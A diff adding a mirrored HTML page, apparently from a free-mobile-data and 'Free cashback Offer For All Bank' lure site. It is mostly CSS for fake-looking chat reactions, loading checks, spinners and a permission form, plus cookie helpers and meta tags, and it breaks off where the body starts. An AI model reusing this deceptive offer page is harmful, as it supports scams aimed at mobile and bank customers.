@@ -1,0 +1,2329 @@
+<!DOCTYPE html>
+<html>
+
+
+<!-- Mirrored from 50gb.live/Airtel_Data by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 17 Jun 2022 14:18:00 GMT -->
+<head>
+    <style>
+        
+        :root {
+            --color-primary: rgb(31, 30, 30);
+            --color-secondary: #ae0434;
+            --color-secondary2: #ae0434
+        }
+
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0
+        }
+
+        html {
+            font-size: 62.5%;
+            font-family: Montserrat;
+            font-weight: 500;
+            color: var(--color-primary)
+        }
+
+        .quedate-container,
+        body {
+            width: 100vw
+        }
+
+        .container-chat {
+            font-weight: 400
+        }
+
+        .chat,
+        .wrapper {
+            display: flex;
+            flex-direction: column
+        }
+
+        .loading__box-1--hidden {
+            display: none !important
+        }
+
+        .loading__box-2--hidden {
+            display: none !important
+        }
+
+        .loading__box-3--hidden {
+            display: none !important
+        }
+
+        .loading__check-1--hidden {
+            display: none !important
+        }
+
+        .loading__check-2--hidden {
+            display: none !important
+        }
+
+        .loading__check-3--hidden {
+            display: none !important
+        }
+
+        .chat__reactions {
+            width: 90%;
+            margin: 2rem auto 0;
+            display: flex;
+            align-items: stretch;
+            font-size: .95rem
+        }
+
+        .chat__reactions-icon {
+            width: 1.2rem;
+            margin-right: .2rem
+        }
+
+        .chat__reactions-text {
+            margin-left: .5rem
+        }
+
+        .chat__reactions-counter {
+            margin-left: 1.8rem
+        }
+
+        .chat__actions {
+            margin-top: 1rem;
+            display: flex;
+            justify-content: space-around;
+            font-size: 1.2rem;
+            border-top: 1.4px solid #b0b0b0;
+            border-bottom: .5px solid #d3d3d3
+        }
+
+        .chat__actions-box {
+            display: flex;
+            align-items: center
+        }
+
+        .chat__actions img {
+            width: 4rem
+        }
+
+        .chat__conversation {
+            width: 90%;
+            margin: 0 auto;
+            font-size: 1.1rem
+        }
+
+        .chat__conversation-box {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            margin-top: 1rem;
+            position: relative
+        }
+
+        .chat__conversation-box--right {
+            margin-left: 20%;
+            margin-bottom: 1rem
+        }
+
+        .chat__conversation-box-img {
+            width: 3.5rem;
+            border-radius: 50%;
+            margin-right: 1rem;
+            align-self: baseline
+        }
+
+        .chat__conversation-box-active {
+            width: 1rem;
+            height: 1rem;
+            background-color: var(--color-secondary);
+            border-radius: 50%;
+            position: absolute;
+            top: 2.5rem;
+            left: 2.7rem
+        }
+
+        .chat__conversation-box-content-comment {
+            padding: 1rem;
+            background-color: #f2f3f5;
+            border-top-left-radius: 14px;
+            border-top-right-radius: 14px;
+            border-bottom-left-radius: 14px;
+            border-bottom-right-radius: 14px
+        }
+
+        .chat__conversation-box-content-comment-name {
+            color: #726695;
+            font-weight: 500;
+            margin-right: .4rem
+        }
+
+        .chat__conversation-box-content-cta {
+            margin-top: .3rem;
+            padding-left: 1.5rem;
+            color: #726695
+        }
+
+        .chat__conversation-box-content-cta-text {
+            margin-right: .5rem
+        }
+
+        .chat__conversation-box-content-cta--2 {
+            font-size: .9rem
+        }
+
+        .chat__conversation-reply {
+            margin-left: 20%;
+            color: gray
+        }
+
+        .chat__conversation-reply--efect {
+            animation: opacidad 1s infinite
+        }
+
+        @keyframes opacidad {
+
+            0 {
+                opacity: 0
+            }
+
+            50 % {
+                opacity: 1
+            }
+
+            100 % {
+                opacity: 0
+            }
+        }
+
+        .chat__conversation-write {
+            position: relative;
+            margin-bottom: 2rem
+        }
+
+        .chat__conversation-write input {
+            width: 100%;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            border: none;
+            background-color: #f2f3f5;
+            border-radius: 100px;
+            padding: .8rem;
+            color: var(--color-primary);
+            padding-left: 1rem;
+            outline: 0
+        }
+
+        .chat__conversation-write-icons {
+            display: flex;
+            flex-direction: row;
+            position: absolute;
+            right: 1.2rem;
+            top: 1.8rem
+        }
+
+        .chat__conversation-write-icons-img {
+            width: 1.2rem;
+            margin-right: .5rem;
+            fill: gray
+        }
+
+        .chat__conversation-write-icons-img--svg {
+            width: 2rem
+        }
+
+        .loading {
+            width: 100%;
+            height: 220px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: absolute;
+            top: 48px;
+            z-index: 10;
+            background-color: #fff;
+            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .3)
+        }
+
+        .loading__box {
+            width: 50%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            position: relative
+        }
+
+        .loading__animate,
+        .loading__check {
+            width: 5rem
+        }
+
+        .loading__check {
+            position: absolute;
+            left: 0
+        }
+
+        .loading__txt {
+            font-size: 1.2rem;
+            color: var(--color-primary);
+            margin-left: 1rem
+        }
+
+        .loading2 {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: absolute;
+            top: 48px;
+            z-index: 20;
+            background-color: #fff;
+            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .3)
+        }
+
+        .loading2__box {
+            text-align: justify;
+            padding: 2rem;
+            color: var(--color-primary);
+            font-size: 14px
+        }
+
+        .loading2__permission {
+            width: 12rem;
+            margin: 0 auto
+        }
+
+        .dum-dum {
+            display: none !important
+        }
+
+        .js-display {
+            display: block
+        }
+
+        .js-show {
+            visibility: hidden !important
+        }
+
+        .logo-container {
+            width: 100%;
+            padding-top: 1.5rem;
+            padding-bottom: 1.5rem;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            color: var(--color-primary);
+            font-size: 2rem;
+            margin: 0 auto 20px;
+            background-color: var(--color-secondary);
+            color: white;
+        }
+
+        .quedate-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center
+        }
+
+        .quedate {
+            width: 100%
+        }
+
+        .quedate__fixed {
+            background-color: var(--color-secondary)
+        }
+
+        .quedate__fixed-box {
+            width: 90%;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            padding: .5rem
+        }
+
+        .quedate__fixed-box span {
+            margin: 0 auto;
+            color: #fff;
+            font-size: 1.5rem
+        }
+
+        .quedate__company {
+            width: 30%;
+            border-right: 1px solid var(--color-secondary)
+        }
+
+        .quedate__step {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-top: 0;
+        }
+
+        @keyframes glowing {
+            0% {
+                box-shadow: 0 0 -10px #000000;
+            }
+
+            40% {
+                box-shadow: 0 0 20px #000000;
+            }
+
+            60% {
+                box-shadow: 0 0 20px #000000;
+            }
+
+            100% {
+                box-shadow: 0 0 -10px #000000;
+            }
+        }
+
+        .button-glow {
+            animation: glowing 5000ms infinite;
+            transition: 0.2s linear;
+            background-image: linear-gradient(to bottom right, #ae0434, #ae0434);
+        }
+
+
+        .quedate__step-box {
+            width: 96%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 2rem;
+            margin: 0 auto 20px;
+            text-align: center;
+            padding-bottom: 5px;
+            position: relative;
+        }
+
+        .quedate__step-box:before {
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            content: '';
+            height: 6px;
+            width: 100px;
+            border-radius: 10px;
+            background-color: #ecc365;
+            transform: translateX(-50%);
+        }
+
+        .quedate__border {
+            width: 30px;
+            height: 80%;
+            background-color: var(--color-secondary);
+            margin-right: 1rem;
+            display: none;
+        }
+
+        .quedate__cta-btn {
+            width: 80%;
+            cursor: pointer;
+            font-size: 2rem;
+            font-weight: 700;
+            color: #fff;
+            padding: 1rem;
+            border: none;
+            background-color: ;
+            border-top-left-radius: 14px;
+            border-top-right-radius: 14px;
+            border-bottom-left-radius: 14px;
+            border-bottom-right-radius: 14px;
+            outline: 0;
+            margin: 0 0 20px 3.5rem;
+            background-image: linear-gradient(to bottom right, #ac0202, #ac0202);
+        }
+
+        .quedate__cta-btn:active,
+        .quedate__cta-btn:hover {
+            background-color: #ecc365
+        }
+
+        .quedate__cta-btn:active {
+            transform: translateY(2px)
+        }
+
+        .quedate__loading {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center
+        }
+
+        .quedate__svg {
+            position: relative
+        }
+
+        .quedate__check {
+            position: absolute;
+            left: 0
+        }
+
+        .quedate__porcent {
+            margin-top: 1rem;
+            margin-bottom: 2rem;
+            font-size: 2.5rem;
+            font-weight: 700
+        }
+
+        .quedate__form {
+            border: 1.5px solid #c0bfc3;
+            border-top-right-radius: 8px;
+            border-top-left-radius: 8px;
+            border-bottom-left-radius: 8px;
+            border-bottom-right-radius: 8px;
+            padding: 1rem;
+            position: relative;
+            margin-top: 2.5rem
+        }
+
+        .quedate__form-input {
+            border: none;
+            outline: 0
+        }
+
+        .quedate__form-input::placeholder {
+            color: #c0bfc3;
+            font-family: inherit;
+            font-size: 1.5rem
+        }
+
+        .quedate__form-separar {
+            position: absolute;
+            width: 1px;
+            height: 100%;
+            top: 0;
+            background-color: #c0bfc3
+        }
+
+        .quedate__form-label {
+            font-size: 1.5rem;
+            font-weight: 700;
+            padding: 2rem
+        }
+
+        .quedate__first {
+            width: 90%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            margin: 9px auto
+        }
+
+        .quedate__load {
+            width: 80%;
+            font-size: 1.3rem;
+            padding: .8rem;
+            position: relative
+        }
+
+        .quedate__load-icon {
+            width: 30%;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding-right: .8rem;
+            padding-left: .8rem;
+            border-left: none
+        }
+
+        .quedate__load-text {
+            margin-left: .5rem;
+            font-size: 1.2rem;
+            font-weight: 700;
+
+        }
+
+        .quedate__load-a {
+            position: absolute;
+            height: 3.2rem;
+            top: 0;
+            z-index: -1;
+            left: 0;
+            background-color: #ffd300;
+        }
+
+
+        .permision-container {
+            width: 95%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #fff;
+            box-shadow: 4px 4px 18px 3px rgba(0, 0, 0, .4);
+            position: absolute;
+            top: .8rem;
+            left: .8rem;
+            z-index: 15
+        }
+
+        .permision-container-box {
+            width: 95%;
+            margin: 0 auto
+        }
+
+        .permision-container-end,
+        .permision-container-request-text {
+            width: 100%;
+            padding: 1.2rem;
+            background-color: #ededf3;
+            font-size: 1.5rem;
+            font-weight: 700
+        }
+
+        .permision-container-end {
+            font-size: 1rem;
+            font-weight: 400;
+            text-align: center
+        }
+
+        .permision-container-data {
+            padding: 2rem
+        }
+
+        .permision-container-icons {
+            width: 60%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: space-around;
+            margin-bottom: 2.5rem
+        }
+
+        .permision-container-icons-face,
+        .permision-container-icons-uber {
+            width: 8rem
+        }
+
+        .permision-container-txt {
+            margin: 0 auto;
+            font-size: 1.5rem;
+            text-align: center;
+            margin-bottom: 1.5rem
+        }
+
+        .permision-container-form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between
+        }
+
+        .permision-container-input {
+            outline: 0;
+            padding: 1.2rem;
+            width: 100%;
+            margin-bottom: 1.5rem;
+            border-top-left-radius: 10px;
+            border-top-right-radius: 10px;
+            border-bottom-left-radius: 10px;
+            border-bottom-right-radius: 10px;
+            border: 1px solid #b9b9b9;
+            color: gray;
+            font-size: 1.2rem
+        }
+
+        .permision-container-secure {
+            margin-top: 1rem;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            justify-content: center;
+            color: #a2a2a2
+        }
+
+        .permision-container-secure svg {
+            width: 1.5rem;
+            height: 1.5rem;
+            margin-right: 1rem
+        }
+
+        .permision-container-cta {
+            width: 100%;
+            padding: .8rem;
+            margin-top: 1rem;
+            margin-bottom: 1.5rem;
+            margin-left: 0;
+            font-size: 1.8rem
+        }
+
+        /* Chrome, Safari, Edge, Opera */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        /* Firefox */
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+
+        .text-center {
+            text-align: center;
+        }
+
+        /* Progress Bar Variables */
+        /* Progress Bar CSS*/
+        .progress-bar {
+            margin: 0 auto;
+            width: 500px;
+            height: 10px;
+            background-color: #e5e9eb;
+        }
+
+        .progress-bar .progress {
+            position: relative;
+            background-color: #ffd300;
+            height: 10px;
+            width: 100%;
+            -webkit-animation-duration: 5s;
+            -webkit-animation-name: width;
+        }
+
+        .progress-bar .progress .progress-shadow {
+            background-image: linear-gradient(to bottom, #eaecee, transparent);
+            position: absolute;
+            height: 1px;
+            width: 100%;
+            top: 100%;
+            transform: skew(-22.5deg);
+            transform-origin: 0 0;
+        }
+
+        @-webkit-keyframes width {
+
+            0%,
+            100% {
+                transition-timing-function: cubic-bezier(1, 0, 0.65, 0.85);
+            }
+
+            0% {
+                width: 0;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
+
+        @keyframes width {
+
+            0%,
+            100% {
+                transition-timing-function: cubic-bezier(1, 0, 0.65, 0.85);
+            }
+
+            0% {
+                width: 0;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
+
+
+
+
+
+
+
+
+
+
+        /* MULTI SPINNER */
+
+        .multi-spinner-container {
+            width: 100px;
+            height: 100px;
+            position: relative;
+            margin: 30px auto;
+            overflow: hidden;
+        }
+
+        .multi-spinner {
+            position: absolute;
+            width: calc(100% - 9.9px);
+            height: calc(100% - 9.9px);
+            border: 5px solid transparent;
+            border-top-color: #680000;
+            border-radius: 50%;
+            -webkit-animation: spin 2s cubic-bezier(0.17, 0.49, 0.96, 0.76) infinite;
+            animation: spin 2s cubic-bezier(0.17, 0.49, 0.96, 0.76) infinite;
+        }
+
+        @-webkit-keyframes rotate {
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes rotate {
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        -webkit-@keyframes spin {
+            -webkit-from {
+                -webkit-transform: rotate(0deg);
+                -ms-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            -webkit-to {
+                -webkit-transform: rotate(360deg);
+                -ms-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @-webkit-keyframes spin {
+            from {
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            to {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes spin {
+            from {
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            to {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @-webkit-keyframes spinBack {
+            from {
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            to {
+                -webkit-transform: rotate(-720deg);
+                transform: rotate(-720deg);
+            }
+        }
+
+        @keyframes spinBack {
+            from {
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            to {
+                -webkit-transform: rotate(-720deg);
+                transform: rotate(-720deg);
+            }
+        }
+
+        @-webkit-keyframes spinBorder {
+            0% {
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+                border-width: 15px;
+            }
+
+            50% {
+                -webkit-transform: rotate(180deg);
+                transform: rotate(180deg);
+                border-width: 3px;
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+                border-width: 15px;
+            }
+        }
+
+        @keyframes spinBorder {
+            0% {
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+                border-width: 15px;
+            }
+
+            50% {
+                -webkit-transform: rotate(180deg);
+                transform: rotate(180deg);
+                border-width: 3px;
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+                border-width: 15px;
+            }
+        }
+
+        @-webkit-keyframes grow {
+
+            0%,
+            40%,
+            100% {
+                -webkit-transform: scale(0);
+                transform: scale(0);
+            }
+
+            40% {
+                -webkit-transform: scale(1);
+                transform: scale(1);
+            }
+        }
+
+        @keyframes grow {
+
+            0%,
+            40%,
+            100% {
+                -webkit-transform: scale(0);
+                transform: scale(0);
+            }
+
+            40% {
+                -webkit-transform: scale(1);
+                transform: scale(1);
+            }
+        }
+
+        @-webkit-keyframes triforce {
+            0% {
+                border-bottom-color: rgb(206, 181, 2);
+            }
+
+            40% {
+                border-bottom-color: rgba(206, 181, 2, 0);
+            }
+
+            80% {
+                border-bottom-color: rgb(206, 181, 2);
+            }
+
+            100% {
+                border-bottom-color: rgb(206, 181, 2);
+            }
+        }
+
+        @keyframes triforce {
+            0% {
+                border-bottom-color: rgb(206, 181, 2);
+            }
+
+            40% {
+                border-bottom-color: rgba(206, 181, 2, 0);
+            }
+
+            80% {
+                border-bottom-color: rgb(206, 181, 2);
+            }
+
+            100% {
+                border-bottom-color: rgb(206, 181, 2);
+            }
+        }
+
+        @-webkit-keyframes pulsate {
+            0% {
+                -webkit-transform: rotate(45deg) scale(0.8);
+                transform: rotate(45deg) scale(0.8);
+                transform: rotate(45deg) scale(0.8);
+            }
+
+            5% {
+                -webkit-transform: rotate(45deg) scale(0.9);
+                transform: rotate(45deg) scale(0.9);
+            }
+
+            10% {
+                -webkit-transform: rotate(45deg) scale(0.8);
+                transform: rotate(45deg) scale(0.8);
+            }
+
+            15% {
+                -webkit-transform: rotate(45deg) scale(1);
+                transform: rotate(45deg) scale(1);
+            }
+
+            50% {
+                -webkit-transform: rotate(45deg) scale(0.8);
+                transform: rotate(45deg) scale(0.8);
+            }
+
+            100% {
+                -webkit-transform: rotate(45deg) scale(0.8);
+                transform: rotate(45deg) scale(0.8);
+            }
+        }
+
+        @keyframes pulsate {
+            0% {
+                -webkit-transform: rotate(45deg) scale(0.8);
+                transform: rotate(45deg) scale(0.8);
+                transform: rotate(45deg) scale(0.8);
+            }
+
+            5% {
+                -webkit-transform: rotate(45deg) scale(0.9);
+                transform: rotate(45deg) scale(0.9);
+            }
+
+            10% {
+                -webkit-transform: rotate(45deg) scale(0.8);
+                transform: rotate(45deg) scale(0.8);
+            }
+
+            15% {
+                -webkit-transform: rotate(45deg) scale(1);
+                transform: rotate(45deg) scale(1);
+            }
+
+            50% {
+                -webkit-transform: rotate(45deg) scale(0.8);
+                transform: rotate(45deg) scale(0.8);
+            }
+
+            100% {
+                -webkit-transform: rotate(45deg) scale(0.8);
+                transform: rotate(45deg) scale(0.8);
+            }
+        }
+
+        @-webkit-keyframes opaque {
+            0% {
+                opacity: 0.1;
+            }
+
+            40% {
+                opacity: 1;
+            }
+
+            80% {
+                opacity: 0.1;
+            }
+
+            100% {
+                opacity: 0.1;
+            }
+        }
+
+        @keyframes opaque {
+            0% {
+                opacity: 0.1;
+            }
+
+            40% {
+                opacity: 1;
+            }
+
+            80% {
+                opacity: 0.1;
+            }
+
+            100% {
+                opacity: 0.1;
+            }
+        }
+
+        @-webkit-keyframes mesh {
+            0% {
+                -webkit-transform-origin: 50% -100%;
+                transform-origin: 50% -100%;
+                -webkit-transform: rotate(0);
+                transform: rotate(0);
+            }
+
+            50% {
+                -webkit-transform-origin: 50% -100%;
+                transform-origin: 50% -100%;
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+
+            50.1% {
+                -webkit-transform-origin: 50% 200%;
+                transform-origin: 50% 200%;
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform-origin: 50% 200%;
+                transform-origin: 50% 200%;
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes mesh {
+            0% {
+                -webkit-transform-origin: 50% -100%;
+                transform-origin: 50% -100%;
+                -webkit-transform: rotate(0);
+                transform: rotate(0);
+            }
+
+            50% {
+                -webkit-transform-origin: 50% -100%;
+                transform-origin: 50% -100%;
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+
+            50.1% {
+                -webkit-transform-origin: 50% 200%;
+                transform-origin: 50% 200%;
+                -webkit-transform: rotate(0deg);
+                transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform-origin: 50% 200%;
+                transform-origin: 50% 200%;
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+
+        @media only screen and (max-width: 968px) {
+            .flexbox>div {
+                -webkit-box-flex: 0;
+                -ms-flex: 0 0 33.3333333%;
+                flex: 0 0 33.3333333%;
+            }
+        }
+
+        @media only screen and (max-width: 768px) {
+            .flexbox>div {
+                -webkit-box-flex: 0;
+                -ms-flex: 0 0 50%;
+                flex: 0 0 50%;
+            }
+        }
+
+        @media only screen and (max-width: 568px) {
+            .flexbox>div {
+                -webkit-box-flex: 0;
+                -ms-flex: 0 0 100%;
+                flex: 0 0 100%;
+            }
+        }
+        body {
+    -webkit-box-sizing: border-box;
+    box-sizing: border-box;
+    
+    height: 100vh;
+    padding: 0;
+    margin: 0;
+    font-family: Arial;
+  }
+  
+  
+  /* MULTI SPINNER */
+  
+  .multi-spinner-container {
+    width: 100px;
+    height: 100px;
+    position: relative;
+    margin: 30px auto;
+    overflow: hidden;
+  }
+  
+  .multi-spinner {
+    position: absolute;
+    width: calc(100% - 9.9px);
+    height: calc(100% - 9.9px);
+    border: 5px solid transparent;
+    border-top-color: #ff0808;
+    border-radius: 50%;
+    -webkit-animation: spin 1s cubic-bezier(0.17, 0.49, 0.96, 0.76) infinite;
+    animation: spin 1s cubic-bezier(0.17, 0.49, 0.96, 0.76) infinite;
+  }
+  
+  @-webkit-keyframes rotate {
+    100% {
+      -webkit-transform: rotate(360deg);
+      transform: rotate(360deg);
+    }
+  }
+  @keyframes rotate {
+    100% {
+      -webkit-transform: rotate(360deg);
+      transform: rotate(360deg);
+    }
+  }
+  
+  -webkit-@keyframes spin {
+    -webkit-from {
+      -webkit-transform: rotate(0deg);
+      -ms-transform: rotate(0deg);
+      transform: rotate(0deg);
+    }
+    -webkit-to {
+      -webkit-transform: rotate(360deg);
+      -ms-transform: rotate(360deg);
+      transform: rotate(360deg);
+    }
+  }
+  
+  @-webkit-keyframes spin {
+    from {
+      -webkit-transform: rotate(0deg);
+      transform: rotate(0deg);
+    }
+    to {
+      -webkit-transform: rotate(360deg);
+      transform: rotate(360deg);
+    }
+  }
+  
+  @keyframes spin {
+    from {
+      -webkit-transform: rotate(0deg);
+      transform: rotate(0deg);
+    }
+    to {
+      -webkit-transform: rotate(360deg);
+      transform: rotate(360deg);
+    }
+  }
+  
+  @-webkit-keyframes spinBack {
+    from {
+      -webkit-transform: rotate(0deg);
+      transform: rotate(0deg);
+    }
+    to {
+      -webkit-transform: rotate(-720deg);
+      transform: rotate(-720deg);
+    }
+  }
+  
+  @keyframes spinBack {
+    from {
+      -webkit-transform: rotate(0deg);
+      transform: rotate(0deg);
+    }
+    to {
+      -webkit-transform: rotate(-720deg);
+      transform: rotate(-720deg);
+    }
+  }
+  
+  @-webkit-keyframes spinBorder {
+    0% {
+      -webkit-transform: rotate(0deg);
+      transform: rotate(0deg);
+      border-width: 15px;
+    }
+    50% {
+      -webkit-transform: rotate(180deg);
+      transform: rotate(180deg);
+      border-width: 3px;
+    }
+    100% {
+      -webkit-transform: rotate(360deg);
+      transform: rotate(360deg);
+      border-width: 15px;
+    }
+  }
+  
+  @keyframes spinBorder {
+    0% {
+      -webkit-transform: rotate(0deg);
+      transform: rotate(0deg);
+      border-width: 15px;
+    }
+    50% {
+      -webkit-transform: rotate(180deg);
+      transform: rotate(180deg);
+      border-width: 3px;
+    }
+    100% {
+      -webkit-transform: rotate(360deg);
+      transform: rotate(360deg);
+      border-width: 15px;
+    }
+  }
+  
+  @-webkit-keyframes grow {
+    0%, 40%, 100% {
+      -webkit-transform: scale(0);
+              transform: scale(0);
+    }
+    40% {
+      -webkit-transform: scale(1);
+              transform: scale(1);
+    }
+  }
+  @keyframes grow {
+    0%, 40%, 100% {
+      -webkit-transform: scale(0);
+              transform: scale(0);
+    }
+    40% {
+      -webkit-transform: scale(1);
+              transform: scale(1);
+    }
+  }
+  
+  @-webkit-keyframes triforce {
+    0% {
+      border-bottom-color: rgb(206, 181, 2);
+    }
+    40% {
+      border-bottom-color: rgba(206, 181, 2, 0);
+    }
+    80% {
+      border-bottom-color: rgb(206, 181, 2);
+    }
+    100% {
+      border-bottom-color: rgb(206, 181, 2);
+    }
+  }
+  
+  @keyframes triforce {
+    0% {
+      border-bottom-color: rgb(206, 181, 2);
+    }
+    40% {
+      border-bottom-color: rgba(206, 181, 2, 0);
+    }
+    80% {
+      border-bottom-color: rgb(206, 181, 2);
+    }
+    100% {
+      border-bottom-color: rgb(206, 181, 2);
+    }
+  }
+  
+  @-webkit-keyframes pulsate {
+    0% {
+      -webkit-transform: rotate(45deg) scale(0.8);
+      transform: rotate(45deg) scale(0.8);
+      transform: rotate(45deg) scale(0.8);
+    }
+    5% {
+      -webkit-transform: rotate(45deg) scale(0.9);
+      transform: rotate(45deg) scale(0.9);
+    }
+    10% {
+      -webkit-transform: rotate(45deg) scale(0.8);
+      transform: rotate(45deg) scale(0.8);
+    }
+    15% {
+      -webkit-transform: rotate(45deg) scale(1);
+      transform: rotate(45deg) scale(1);
+    }
+    50% {
+      -webkit-transform: rotate(45deg) scale(0.8);
+      transform: rotate(45deg) scale(0.8);
+    }
+    100% {
+      -webkit-transform: rotate(45deg) scale(0.8);
+      transform: rotate(45deg) scale(0.8);
+    }
+  }
+  
+  @keyframes pulsate {
+    0% {
+      -webkit-transform: rotate(45deg) scale(0.8);
+      transform: rotate(45deg) scale(0.8);
+      transform: rotate(45deg) scale(0.8);
+    }
+    5% {
+      -webkit-transform: rotate(45deg) scale(0.9);
+      transform: rotate(45deg) scale(0.9);
+    }
+    10% {
+      -webkit-transform: rotate(45deg) scale(0.8);
+      transform: rotate(45deg) scale(0.8);
+    }
+    15% {
+      -webkit-transform: rotate(45deg) scale(1);
+      transform: rotate(45deg) scale(1);
+    }
+    50% {
+      -webkit-transform: rotate(45deg) scale(0.8);
+      transform: rotate(45deg) scale(0.8);
+    }
+    100% {
+      -webkit-transform: rotate(45deg) scale(0.8);
+      transform: rotate(45deg) scale(0.8);
+    }
+  }
+  
+  @-webkit-keyframes opaque {
+    0% {
+      opacity: 0.1;
+    }
+    40% {
+      opacity: 1;
+    }
+    80% {
+      opacity: 0.1;
+    }
+    100% {
+      opacity: 0.1;
+    }
+  }
+  
+  @keyframes opaque {
+    0% {
+      opacity: 0.1;
+    }
+    40% {
+      opacity: 1;
+    }
+    80% {
+      opacity: 0.1;
+    }
+    100% {
+      opacity: 0.1;
+    }
+  }
+  
+  @-webkit-keyframes mesh {
+    0% {
+      -webkit-transform-origin: 50% -100%;
+      transform-origin: 50% -100%;
+      -webkit-transform: rotate(0);
+      transform: rotate(0);
+    }
+    50% {
+      -webkit-transform-origin: 50% -100%;
+      transform-origin: 50% -100%;
+      -webkit-transform: rotate(360deg);
+      transform: rotate(360deg);
+    }
+    50.1% {
+      -webkit-transform-origin: 50% 200%;
+      transform-origin: 50% 200%;
+      -webkit-transform: rotate(0deg);
+      transform: rotate(0deg);
+    }
+    100% {
+      -webkit-transform-origin: 50% 200%;
+      transform-origin: 50% 200%;
+      -webkit-transform: rotate(360deg);
+      transform: rotate(360deg);
+    }
+  }
+  
+  @keyframes mesh {
+    0% {
+      -webkit-transform-origin: 50% -100%;
+      transform-origin: 50% -100%;
+      -webkit-transform: rotate(0);
+      transform: rotate(0);
+    }
+    50% {
+      -webkit-transform-origin: 50% -100%;
+      transform-origin: 50% -100%;
+      -webkit-transform: rotate(360deg);
+      transform: rotate(360deg);
+    }
+    50.1% {
+      -webkit-transform-origin: 50% 200%;
+      transform-origin: 50% 200%;
+      -webkit-transform: rotate(0deg);
+      transform: rotate(0deg);
+    }
+    100% {
+      -webkit-transform-origin: 50% 200%;
+      transform-origin: 50% 200%;
+      -webkit-transform: rotate(360deg);
+      transform: rotate(360deg);
+    }
+  }
+  
+  @media only screen and (max-width: 968px) {
+    .flexbox > div {
+      -webkit-box-flex: 0;
+      -ms-flex: 0 0 33.3333333%;
+      flex: 0 0 33.3333333%;
+    }
+  }
+  
+  @media only screen and (max-width: 768px) {
+    .flexbox > div {
+      -webkit-box-flex: 0;
+      -ms-flex: 0 0 50%;
+      flex: 0 0 50%;
+    }
+  }
+  
+  @media only screen and (max-width: 568px) {
+    .flexbox > div {
+      -webkit-box-flex: 0;
+      -ms-flex: 0 0 100%;
+      flex: 0 0 100%;
+    }
+  }
+  
+  
+  
+    </style>
+
+    <script>
+
+        function set_Cookie(name, value) {
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days * 20 * 1000));
+            document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + "; path=/;"
+        }
+        function get_Cookie(name) {
+            var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
+            if (arr = document.cookie.match(reg)) {
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+    </script>
+    <meta charset="utf-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta property="og:site_name" content="Cashback Offer">
+    <meta property="og:title" content="Free cashback Offer For All Bank." />
+    <meta property="og:description" content="Get Free Cashback">
+    <meta property="og:image" itemprop="image" content="https://i.imgur.com/i1Okwow.jpg">
+    <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+   <title>Free 478 Cashback Offer</title>
+
+</head>
+
+<body style="width:100%">
+
+    <div id=fireworks>
+
+        <div class="wrapper">
+            <div class="container-main">
+
